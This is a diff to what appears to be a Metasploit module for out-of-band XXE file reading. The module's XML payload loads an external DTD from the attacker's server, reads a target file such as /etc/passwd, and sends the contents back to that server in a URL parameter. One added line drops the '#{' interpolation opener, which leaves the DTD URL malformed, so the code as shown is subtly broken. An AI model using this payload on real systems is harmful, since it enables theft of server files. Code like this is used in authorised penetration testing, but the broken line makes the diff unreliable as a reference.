@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptAddressRoutable.new('SRVHOST', [true, 'The local host to listen on and use for incoming connections.', Rex::Socket.source_address]),
+        OptAddressRoutable.new('SRVHOST', [false, 'The local host to listen on and use for incoming connections.']),
         OptString.new('TARGETURI', [ true, 'The base path to the web application', '/']),
         OptString.new('TARGETFILE', [ true, 'The target file to read', '/etc/passwd']),
         OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false])
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     ent_file = Rex::Text.rand_text_alpha_lower(4..8)
     %(
       <!ENTITY % #{ent_file} SYSTEM "#{filter_path}">
-      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM 'http://#{srvhost}:#{datastore['SRVPORT']}/?#{leak_param_name}=%#{ent_file};'>">
+      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM '#{get_uri}/?#{leak_param_name}=%#{ent_file};'>">
     )
   end
 
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
     xml += '['
     xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
-    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{srvhost}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
+    xml += "    <!ENTITY % #{param_entity_name} SYSTEM '#{get_uri}/Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
     xml += ']'
     xml += "> <r>&#{ent_eval};</r>"
 
